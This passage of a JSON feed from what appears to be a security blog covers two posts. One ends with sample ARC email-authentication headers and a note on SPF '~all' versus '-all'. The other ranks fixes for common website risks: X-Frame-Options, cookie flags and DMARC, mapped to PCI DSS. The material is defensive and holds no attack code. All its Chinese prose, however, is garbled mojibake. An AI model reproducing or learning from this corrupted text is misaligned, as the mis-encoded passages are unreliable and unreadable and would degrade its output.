b=TlCCKzgk3TrAa+G77gYYO8Fxk4q/Ml0biqduZJeOYh6+  </span><br><span class=\"highlight-line\">    0zhwQ8u/lHxLi21pxu347isLSuNtvIagIvAQna9a5A==  </span><br><span class=\"highlight-line\">ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=  </span><br><span class=\"highlight-line\">    lists.example.org; h=message-id:date:from:to:subject; s=dk-    </span><br><span class=\"highlight-line\">    lists; t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYL  </span><br><span class=\"highlight-line\">    Q=; b=DsoD3n3hiwlrN1ma8IZQFgZx8EDO7Wah3hUjIEsYKuShRKYB4LwGUiKD5Y  </span><br><span class=\"highlight-line\">    yHgcIwGHhSc/4+ewYqHMWDnuFxiQ==  </span><br><span class=\"highlight-line\">ARC-Authentication-Results: i=1; lists.example.org; spf=pass  </span><br><span class=\"highlight-line\">    smtp.mfrom=jqd@d1.example; dkim=pass (512-bit key)  </span><br><span class=\"highlight-line\">    header.i=@d1.example; dmarc=pass</span></code></pre>\n<h3 id=\"%E5%B0%8F%E7%B5%90\"><a class=\"direct-link\" href=\"#%E5%B0%8F%E7%B5%90\">#</a> å°çµ</h3>\n<p>é›–ç„¶ ARC ç”¨æ•¸ä½ç°½ç« çš„æ–¹å¼åšæ“”ä¿ï¼Œçœ‹ä¼¼è§£æ±ºäº† Indirect Mail Flow çš„å•é¡Œï¼Œä½†ä»–ä¸¦ä¸æ˜¯è¬éˆä¸¹ã€‚ç•¢ç«Ÿ ARC åªæ˜¯æä¾›æ›´å¤šè³‡è¨Šè®“æœ€çµ‚æ”¶ä¿¡ç«¯å¯ä»¥çœ‹åˆ°ä¸­é–“ã€éš±å½¢çš„éƒ¨åˆ†ã€ï¼Œä¸¦ä¸èƒ½ä¿è­‰æ¯ä¸€å€‹ç¶“éçš„ mediator éƒ½æ˜¯å€¼å¾—ä¿¡ä»»çš„ã€‚</p>\n<p>å†è€…ï¼Œå° mail server è€Œè¨€ ARC åªæ˜¯åƒè€ƒæŒ‡æ¨™ï¼ˆMAYÂ â€¦ consultÂ â€¦ ARCï¼‰ï¼Œç„¡è«–çµæœå¦‚ä½•ï¼Œmail server éƒ½å¯ä»¥åªæ¡ç”¨æœ¬èº« DMARC é©—è­‰çš„çµæœæ±ºå®šä¿¡ä»¶å»ç•™ï¼Œä¸¦ä¸ä¸€å®šè¦æ¡ç´ ARCã€‚</p>\n<p>é—œæ–¼ ARC çš„è¨±å¤šç´°ç¯€éƒ½é‚„æœ‰å¾…è¨è«–ï¼Œæœªä¾†ä¹Ÿè¨±æœƒåŠ å…¥å…¶ä»–è¦ç¯„è®“é€™å€‹æ©Ÿåˆ¶æ›´åŠ å®Œæ•´ï¼Œæ›´å¤šè³‡è¨Šå¯ä»¥åƒè€ƒ <a href=\"http://arc-spec.org\">ARC-spec</a> è·Ÿ <a href=\"https://datatracker.ietf.org/doc/html/rfc8617\">RFC8617</a>ã€‚</p>\n<hr>\n<h2 id=\"q6\"><a class=\"direct-link\" href=\"#q6\">#</a> Q6: å¸¸å¸¸çœ‹åˆ° SPF ç”¨ <code>~all</code> è€Œä¸æ˜¯ <code>-all</code>ï¼Œæœ‰ä»€éº¼å·®ï¼Ÿ</h2>\n<p>å‰é¢åœ¨ SPF è¨­å®šç¯‡æéæœ‰å››ç¨® qualifierï¼Œé€™é‚Šè²¼éä¾†ä¸€éï¼š</p>\n<ul>\n<li><code>pass(+)</code>ï¼šè‹¥å°åˆ° sender-ipï¼Œçµæœ passï¼ˆå³ç™½åå–®ï¼‰ã€‚é è¨­å€¼ï¼Œå¯ä»¥çœç•¥ï¼ˆ <code>+all</code> åŒ <code>all</code>ï¼‰</li>\n<li><code>neutral(?)</code>ï¼šNone ï¼Œç­‰åŒæ²’æœ‰ policyã€‚</li>\n<li><code>softfail(~)</code>ï¼šè‹¥å°åˆ° sender-ipï¼Œçµæœ failï¼Œä»è¦æ¨™æ³¨ä¸¦æ¥å—ã€‚</li>\n<li><code>fail(-)</code>ï¼šè‹¥å°åˆ° sender-ipï¼Œçµæœ failï¼ˆå³é»‘åå–®ï¼‰ã€‚</li>\n</ul>\n<p>å…¶ä¸­ï¼Œå° <code>all</code> æ©Ÿåˆ¶è€Œè¨€æœ€å¸¸å‡ºç¾çš„æ˜¯ <code>softfail(~all)</code> è·Ÿ <code>fail(-all)</code>ã€‚å–®ä»¥ SPF ä¾†èªªï¼Œé€™å…©å€‹çš„å€åˆ¥æ˜é¡¯å°±æ˜¯æŒ‡ç¤ºæ”¶ä¿¡çš„ mail serverã€é›–ç„¶æˆ‘å€‘éƒ½æ˜¯ failï¼Œä½†è«‹ä¿ç•™ softfail çš„ã€ã€‚ä¸éåœ¨æœ‰è¨­å®šè·Ÿä½¿ç”¨ DMARC çš„æƒ…æ³ä¸‹ï¼Œæœ€å¾Œ MDA åªæœƒæ ¹æ“š DMARC åˆ¤å®šçš„ policy ä¾†æ±ºå®šæ¡å–çš„è¡Œç‚ºï¼Œå› ç‚º <code>softfail</code> è·Ÿ <code>fail</code> éƒ½å° DMARC çµ¦å‡ºäº† fail çš„çµæœï¼Œæ‰€ä»¥ä»–å€‘å…¶å¯¦æ˜¯ç­‰åƒ¹çš„ã€‚åªæœ‰åœ¨å–®ç¨ä½¿ç”¨ SPF é©—è­‰çš„æ™‚å€™ï¼Œ<code>softfail</code> è·Ÿ <code>fail</code> çš„å·®åˆ¥æ‰æœƒé€ æˆå½±éŸ¿ã€‚</p>\n<hr>\n<h2 id=\"references%3A\"><a class=\"direct-link\" href=\"#references%3A\">#</a> References:</h2>\n<ol>\n<li><a href=\"https://en.wikipedia.org/wiki/Email_forwarding\">Email Forwardingâ€Šâ€”â€ŠWikipedia</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7960#section-2\">RFC7960</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc5598#section-5\">RFC5598</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc8617\">RFC8617</a></li>\n</ol>\n",
      "date_published": "2021-07-23T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-fix/",
      "title": "è³‡å®‰ç§‘æ™®ç•ªå¤–ç¯‡ï¼ˆäºŒï¼‰-å¦‚ä½•æœ‰æ•ˆç‡é¸æ“‡é¢¨éšªé€²è¡Œä¿®å¾© feat.é¢¨éšªå’Œæ³•è¦æ¯æ¯ç›¸é—œï¼Ÿï¼",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p>ç¹¼ä¸Šä¸€ç¯‡çš„<a href=\"https://tech-blog.cymetrics.io/jo/zerobased-common-risk-exposure/\"><strong>è³‡å®‰ç§‘æ™®ç•ªå¤–ç¯‡ï¼ˆä¸€ï¼‰-å¤§æ„äº†å•Šæ²’æœ‰é–ƒï¼å¸¸è¦‹ç¶²ç«™æ›éšªä½ ä¸­äº†å¹¾é …ï¼Ÿï¼</strong></a>)ä¹‹å¾Œï¼Œæ¥è‘—æˆ‘å€‘è¦ä¾†è«‡è«‡é—œæ–¼ç¶²ç«™é¢¨éšªçš„ä¿®å¾©ï¼Œé€™éƒ¨åˆ†æˆ‘æƒ³å¤§å®¶çš„ç›´è¦ºæ‡‰è©²éƒ½æ˜¯<strong>ç„¡æ¢ä»¶é«˜é¢¨éšªå…ˆä¿®</strong>ï¼Œä½†ç•¶ä»¥é€™å€‹æ€ç¶­åŸ·è¡Œæ™‚ï¼Œ<strong>æŠŠæ™‚é–“ä»¥åŠé‡‘éŒ¢æˆæœ¬åŠ å…¥æ¬Šè¡¡ä¹‹å¾Œï¼Œåˆç¸½æ˜¯å¾ˆé›£çµ¦å‡ºä¸€å€‹ç¬¦åˆè€é—†æœŸå¾…çš„é«˜ CP å€¼ä½œæ³•</strong>ï¼Œè€Œé€™å…¶å¯¦å°±æ˜¯æˆ‘å€‘ä»Šå¤©æ‰€è¦è¨è«–çš„ä¸»é¡Œï¼Œ<strong>å¦‚ä½•æœ‰æ•ˆç‡çš„é¸æ“‡é¢¨éšªé€²è¡Œä¿®å¾©</strong>ä»¥åŠ<strong>é¢¨éšªåœ¨æ³•è¦æŠ€è¡“é¢ä¸Šçš„å½±éŸ¿ã€‚</strong></p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E6%91%98%E8%A6%81\"><a class=\"direct-link\" href=\"#%E6%91%98%E8%A6%81\">#</a> æ‘˜è¦</h2>\n<p>é€™äº›å•†æ¥­ç¶²ç«™ï¼ˆ e.g. æ“æœ‰æœƒå“¡ç™»å…¥ã€é‡‘æµåŠŸèƒ½ï¼‰åœ¨ä¿®å¾©é¢¨éšªä»¥å‰ï¼Œè‹¥å°‡æ”¹å–„è¤‡é›œåº¦åŠ å…¥è€ƒé‡ï¼Œå¯ä»¥å¾ˆå¤§ç¨‹åº¦çš„æ¸›å°‘åœ¨é¢¨éšªç®¡ç†ä¸Šçš„å›°é›£ï¼Œé‚£éº¼ä»€éº¼æ˜¯æ”¹å–„è¤‡é›œåº¦å‘¢ï¼Ÿ</p>\n<p>æ”¹å–„è¤‡é›œåº¦å°±æ˜¯åœ¨æ¬Šè¡¡äº†<strong>æ™‚é–“ä»¥åŠé‡‘éŒ¢æˆæœ¬å¾Œåšå‡ºçš„æœ€é©é¢¨éšªä¿®å¾©æ–¹æ¡ˆã€‚</strong></p>\n<p>èˆ‰ä¾‹ä¾†èªª å¸¸å¸¸æœƒè½åˆ°è¨±å¤šæœ‹å‹åæ‡‰ CSRF Token è¨­ç½®ä¸æ˜“ï¼Œæ²’æœ‰é€™éº¼å¤šæ™‚é–“å¯ä»¥å°é€™é …é¢¨éšªé€²è¡Œè¨­å®šï¼Œé€™æ™‚å€™æˆ‘æœƒè©¢å•å…©å€‹å•é¡Œ</p>\n<ol>\n<li><strong>ç”¢æ¥­åˆ¥æ˜¯å¦ç‚ºé‡‘èç”¢æ¥­ï¼ˆé¢¨éšªç®¡æ§ç‰¹åˆ¥åš´æ ¼çš„ç”¢æ¥­ï¼‰</strong></li>\n<li><strong>ç¶²ç«™çš„ Cookie æ˜¯å¦è¨­ç½®äº† SameSite çš„å±¬æ€§</strong></li>\n</ol>\n<p>å•é€™å…©å€‹å•é¡Œçš„åŸå› ç‚ºï¼Œåœ¨ä¸å±¬æ–¼é¢¨éšªç®¡æ§ç‰¹åˆ¥åš´æ ¼çš„ç”¢æ¥­ä¸­ï¼Œç•¶ç¶²ç«™çš„ Cookie è¨­ç½®äº† SameSite æ™‚ï¼Œé€šå¸¸æ˜¯å¯ä»¥å°‡ CSRF Token çš„è¨­ç½®é †åºå‘å¾Œæ’ï¼Œå¾…æœ‰è³‡æºæ™‚å†åŸ·è¡Œæ­¤é¢¨éšªçš„ä¿®å¾©ï¼ŒåŸå› æ˜¯ SameSite çš„åŠŸèƒ½ä¾¿æ˜¯åœ¨ç¶²ç«™åŸ·è¡Œè·¨ç«™è«‹æ±‚æ™‚ï¼Œè®“ä¼ºæœå™¨ç«¯ç„¡æ³•å¾ Cookie ä¸­å–å¾— Session Id ï¼Œé€²è€Œé˜»æ­¢ CSRF é¢¨éšªçš„ç™¼ç”Ÿï¼Œç•¶ç„¶ï¼Œè‹¥æ˜¯ç¶²ç«™é€£ SameSite çš„å±¬æ€§éƒ½å°šæœªè¨­ç½®çš„è©±ï¼Œé‚£æˆ‘æœƒå¼·çƒˆå»ºè­°å„˜é€ŸåŸ·è¡Œ SameSite çš„è¨­ç½®ï¼Œæ¥è‘—å°‡é è¨ˆèŠ±è²»åœ¨è¨­ç½® CSRF Token é€™é …é«˜æ”¹å–„è¤‡é›œåº¦ä¸­é¢¨éšªçš„äººåŠ›åŠæ™‚é–“ï¼ŒæŒªåˆ°å…¶é¤˜åºåˆ—æ›´é«˜çš„é¢¨éšªä¿®è£œä¸Šï¼ˆ e.g ä½æ”¹å–„è¤‡é›œåº¦ä¸­é¢¨éšªï¼‰</p>\n<p>ç•¶ç„¶æ¬Šè¡¡çš„å› ç´ å¾ˆå¤šï¼Œé™¤äº†æ”¹å–„çš„é›£æ˜“åº¦ä»¥å¤–ï¼Œè©•ä¼°ä¿®å¾©çš„é †åºä¹Ÿå¿…é ˆæ€è€ƒé¢¨éšªæœ¬èº«çš„é¢¨éšªï¼ˆåŒ…æ‹¬æ”»æ“Šé›£æ˜“åº¦ã€å¼±é»æ™®éåº¦ã€æ¼æ´å½±éŸ¿ç¨‹åº¦ï¼‰è€Œåœ¨æ¥ä¸‹ä¾†çš„ç« ç¯€ä¸­ï¼Œæˆ‘ä¹ŸæœƒæŠŠé€™äº›å› ç´ åŠ å…¥èªªæ˜ã€‚</p>\n<p>æ­¤å¤–ï¼Œå› æ‡‰ç”¢æ¥­å°æ–¼æ³•è¦é¢çš„éœ€æ±‚ï¼Œä»¥ä¸‹èªªæ˜ä¹Ÿæœƒæåˆ°å¸¸è¦‹çš„é¢¨éšªå¯èƒ½æœƒå°æ‡‰åˆ°æ³•è¦ä¸­å“ªä¸€é …è¦ç¯„çš„æŠ€è¡“é¢é …ç›®ã€‚</p>\n<h2 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6\">#</a> å¸¸è¦‹é¢¨éšªæ”¹å–„è¤‡é›œåº¦</h2>\n<p>èªªæ˜äº†ä»€éº¼æ˜¯æ”¹å–„è¤‡é›œåº¦å¾Œï¼Œæ¥ä¸‹ä¾†å°‡æ”¹å–„è¤‡é›œåº¦å¯¦éš›å¥—ç”¨åˆ°ä¸Šä¸€ç¯‡ä¸­çš„å¸¸è¦‹é¢¨éšªä¾†å’Œå¤§å®¶èªªæ˜ï¼Œé™¤äº†å¸Œæœ›èƒ½å¤ æ›´æ¸…æ¥šçš„èªªæ˜æ”¹å–„è¤‡é›œåº¦çš„æ¦‚å¿µä»¥å¤–ï¼Œä¹Ÿå¸Œæœ›ç•¶å„ä½é‡åˆ°ä»¥ä¸‹é¢¨éšªæ™‚ï¼Œ èƒ½å¤ ä»¥æ­¤ç•¶åšåƒè€ƒä¾†é€²è¡Œæœ€é©çš„é¢¨éšªä¿®å¾©æ–¹æ¡ˆã€‚</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-fix/p1.png\" alt=\"\"></p>\n<h2 id=\"%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼• X-Frame-Options æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³</h2>\n<p>æ’è¡Œç¬¬äº”çš„ X-Frame-Options è¨­ç½®ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å¤§æ–¼ 50ï¼… çš„ç¶²ç«™è¨­ç½®çš„å®‰å…¨ç­‰ç´šä¸è¶³æˆ–æ˜¯æ²’æœ‰é€²è¡Œè¨­ç½®ï¼ŒX-Frame-Options ç”¨é€”ç‚º<strong>é‡å° Iframe é»æ“ŠåŠ«æŒæ”»æ“Š</strong>çš„æ‰‹æ³•é€²è¡Œé˜²ç¦¦ï¼Œé¿å…ç¶²é è¢«å…§åµŒã€‚</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\">#</a> <strong>æ”¹å–„è¤‡é›œåº¦ç­‰ç´šç‚ºï¼šä½è¤‡é›œåº¦ä¸­é¢¨éšª</strong></h3>\n<p><strong>X-Frame-Options æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³ï¼šå»ºè­°è‹¥</strong>è¦é¿å…æ­¤é¢¨éšªï¼Œéœ€ç¢ºä¿åªæœ‰å¯ä¿¡ä»»ä¾†æºæ‰èƒ½åµŒå…¥ ã€‚</p>\n<p>æ­¤é …ç›®çš„æ”¹å–„è¤‡é›œåº¦ä¸¦ä¸é«˜ï¼Œåªè¦æŒ‰ç…§ä¿®å¾©é¢¨éšªåƒè€ƒè³‡æ–™ä¸­çš„è¨­å®šï¼Œé¸æ“‡é©åˆç¶²ç«™çš„å€¼å³å¯ï¼Œå»ºè­°å¯ä»¥åœ¨ Cookie çš„ä¸‰é …åŸºæœ¬è¨­ç½®å®Œæˆå¾Œé€²è¡Œé¢¨éšªä¿®è£œã€‚</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A\">#</a> å¸¸è¦‹é¢¨éšªå°æ‡‰æ³•è¦æŠ€è¡“é¢é …ç›®ï¼š</h3>\n<p><strong>PCIDSS</strong>ï¼šDevelop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%9C%80%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%9C%80%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%E3%80%82\">#</a> <strong>æ‡¶äººåŒ…ï¼šéœ€é˜²ç¯„å¯èƒ½å°è‡´å…§åµŒæˆ–æ˜¯æ³¨å…¥çš„æ”»æ“Šã€‚</strong></h3>\n<h3 id=\"%E4%BF%AE%E5%BE%A9%E9%A2%A8%E9%9A%AA%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E5%BE%A9%E9%A2%A8%E9%9A%AA%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\">#</a> <strong>ä¿®å¾©é¢¨éšªåƒè€ƒè³‡æ–™ï¼š</strong></h3>\n<p><a href=\"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options\"><strong>X-Frame-Options å›æ‡‰æ¨™é ­ - HTTP | MDN</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼”Cookie åŸºæœ¬è¨­å®šæœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³</h2>\n<p>æ’åç¬¬å››çš„ Cookie åŸºæœ¬è¨­å®šæœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å¤§æ–¼ 60ï¼… çš„ç¶²ç«™è¨­ç½®å®‰å…¨ç­‰ç´šä¸è¶³æˆ–æ˜¯æ²’æœ‰é€²è¡Œè¨­ç½®ï¼Œè€Œ Cookie çš„ä¸‰é …åŸºæœ¬è¨­å®šç‚ºï¼Œèƒ½å¤ <strong>é˜»æ­¢ï¼ˆ XSS ï¼‰è·¨ç«™è…³æœ¬æ”»æ“Šå½±éŸ¿æ“´å¤§</strong>çš„ HttpOnly ã€<strong>å¼·åŒ– Https æ©Ÿåˆ¶</strong>çš„ Secure ä»¥åŠ<strong>é é˜²ï¼ˆ CSRF ï¼‰è·¨ç«™è«‹æ±‚å½å†’</strong>çš„ SameSite ã€‚</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-2\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-2\">#</a> æ”¹å–„è¤‡é›œåº¦ç­‰ç´šç‚ºï¼šä½è¤‡é›œåº¦ä¸­é¢¨éšª</h3>\n<p><strong>SameSite æœªè¨­å®š</strong>ï¼šå»ºè­°ä¾æ“šç¶²ç«™éœ€æ±‚é¸ç”¨ Strict æˆ– Lax é€²è¡Œè¨­å®š</p>\n<p><strong>HttpOnly Flag æœªè¨­å®š</strong>ï¼šå»ºè­°åœ¨è¨­ç½®ä¸­é–‹å•Ÿ HttpOnly</p>\n<p><strong>Secure Flag æœªè¨­å®š</strong>ï¼šå»ºè­°åœ¨è¨­ç½®ä¸­é–‹å•ŸSecure</p>\n<p>ä¸‰å€‹é …ç›®çš„æ”¹å–„è¤‡é›œéƒ½ä¸é«˜ï¼Œå¦‚æœæª¢æ¸¬å‡ºæœªé–‹å•Ÿæˆ–é€²è¡Œè¨­å®šçš„è©±ï¼Œå»ºè­°ä¸‰é …æ‡‰å„ªå…ˆä¸”å„˜é€Ÿé€²è¡Œè¨­ç½®ã€‚</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-2\">#</a> å¸¸è¦‹é¢¨éšªå°æ‡‰æ³•è¦æŠ€è¡“é¢é …ç›®ï¼š</h3>\n<p><strong>PCIDSS</strong>ï¼šDevelop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-2\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.</p>\n</blockquote>\n<blockquote>\n<p>6.5.7: Protect all web applications and application interfaces from cross-site scripting (XSS).</p>\n</blockquote>\n<blockquote>\n<p>6.5.9: Do not allow cross-site request forgery (CSRF).</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E4%BB%A5%E5%8F%8A-csrf-%E7%9A%84%E6%94%BB%E6%93%8A%E4%B9%9F%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E4%BB%A5%E5%8F%8A-csrf-%E7%9A%84%E6%94%BB%E6%93%8A%E4%B9%9F%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\">#</a> <strong>æ‡¶äººåŒ…ï¼šé™¤äº†é˜²ç¯„å¯èƒ½å°è‡´å…§åµŒæˆ–æ˜¯æ³¨å…¥çš„æ”»æ“Šï¼Œé‡å° XSS ä»¥åŠ CSRF çš„æ”»æ“Šä¹Ÿéœ€è¦ç‰¹åˆ¥æ³¨æ„ã€‚</strong></h3>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A\">#</a> é¢¨éšªä¿®å¾©åƒè€ƒè³‡æ–™ï¼š</h3>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly/\"><strong>é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆä¸‰ï¼‰-ç¶²ç«™å®‰å…¨ä¸‰æœ¬æŸ±ï¼ˆSecure &amp; SameSite &amp; HttpOnlyï¼‰</strong></a></p>\n<h2 id=\"%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\">#</a> â„–ï¼“ éƒµä»¶ç³»çµ± DMARCÂ è¨­å®š</h2>\n<p>æ’åç¬¬ä¸‰çš„éƒµä»¶ç³»çµ± DMARC è¨­å®šï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å¤§æ–¼ 70ï¼… çš„ç¶²ç«™DMARC è¨­ç½®ä¸å…¨æˆ–ç„¡è¨­ç½®ï¼Œ<strong>DMARC æœƒå‘æ”¶ä»¶ä¼ºæœå™¨æŒ‡ç¤ºè©²å¦‚ä½•è™•ç†ç‰¹å®šéƒµä»¶</strong>ï¼Œè®“ä¼ºæœå™¨åœ¨æ”¶åˆ°ç–‘ä¼¼ä¾†è‡ªè‡ªèº«æ©Ÿæ§‹å»æœªé€šéé©—è­‰æª¢æŸ¥çš„éƒµä»¶ï¼Œæˆ–æ˜¯ä¸ç¬¦åˆ DMARC æ”¿ç­–è¨˜éŒ„ä¸­é©—è­‰è¦å®šçš„éƒµä»¶æ™‚ï¼Œæ¡å–åˆé©çš„è™•ç½®æ–¹å¼ã€‚</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\">#</a> 